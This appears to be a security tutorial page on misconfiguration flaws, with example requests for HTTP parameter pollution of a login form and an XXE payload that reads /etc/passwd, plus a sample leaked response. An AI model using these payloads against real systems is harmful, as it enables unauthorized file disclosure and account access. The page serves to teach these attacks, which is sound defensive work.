---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Security Misconfiguration

Configuration decisions in the application and in how it is deployed. Some examples are the use of default accounts or credentials in administrative tools or the maintenance of unnecessary features. We can find some scenarios where this vulnerability is found:

## <mark style="color:blue;">HTTP Parameter Pollution</mark>

Manipulate or pollute HTTP requests by injecting multiple parameters with the same name into a single request, potentially allowing to bypass security controls, altering the behavior of the application, or accessing unauthorized data.

We can find a typical example of this vulnerability as follows:

* We send a petition to a login form

{% code overflow="wrap" lineNumbers="true" %}
```bash
https://example.com/login?user=guest&pass=password
```
{% endcode %}

***

* We can create confusion by duplicating the user parameter, which could allow us to get information or even access another account.

{% code overflow="wrap" lineNumbers="true" %}
```bash
https://example.com/login?user=admin&user=guest&pass=password
```
{% endcode %}

***

* We can also do this by modifying directly the request parameters

{% code title="Example request" overflow="wrap" lineNumbers="true" %}
```json
{
    "data": {
        "user": "admin",
        "user": "guest",
        "pass": "password"    
    }
}
```
{% endcode %}

## <mark style="color:blue;">XXE Injection</mark>

XML External Entities, disclose or retrieve arbitrary files from the local system of the target server by modifying the submitted XML document. It can usually be the first step to gain a Remote Code Execution (RCE).

We can find a typical example of this vulnerability as follows:

* A site accepts XML input and parses it without properly securing or validation.

{% code title="Request format" overflow="wrap" lineNumbers="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ELEMENT data ANY >         <!--Allows any input without validation-->
    <!ELEMENT name (#PCDATA)>
]>
<data>
    <name>example</name>
</data>
```
{% endcode %}

***

* We can send an XML petition to request a system file using the _Entity_ parameter

{% code title="XEE payload" overflow="wrap" lineNumbers="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">    <!--The External Entity -->
]>
<data>
    <name>&xxe;</name>
</data>
```
{% endcode %}

***

* With this, the contents of the requested file would be exposed.

{% code title="Example response" overflow="wrap" lineNumbers="true" %}
```xml
<data>
    <name>root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    ...
    </name>
</data>
```
{% endcode %}
